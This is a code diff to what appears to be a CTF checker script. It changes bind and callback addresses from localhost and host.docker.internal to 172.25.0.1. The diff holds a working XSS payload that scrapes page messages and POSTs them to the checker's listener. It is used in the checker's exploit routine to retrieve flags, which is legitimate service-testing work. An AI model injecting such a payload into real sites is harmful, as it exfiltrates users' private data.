@@ -21,7 +21,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
 
 
-HOST = "0.0.0.0"
+HOST = "172.25.0.1"
 PORT = 6452
 
 SERVICE_PORT = 3000
@@ -110,7 +110,7 @@ async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
     assert_in(noise, r.text, "noise missing from note")
 
 
-exploitMessage = """<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:6452/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"""
+exploitMessage = """<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://172.25.0.1:6452/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"""
 result = [None]
 
 webServer = [None]
@@ -149,7 +149,7 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     server_thread.start()
     time.sleep(1)
     # sanity check
-    logger.debug( (await client.get(f"http://host.docker.internal:{PORT}/example")).text)
+    logger.debug( (await client.get(f"http://172.25.0.1:{PORT}/example")).text)
     username = secrets.token_hex(32)
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
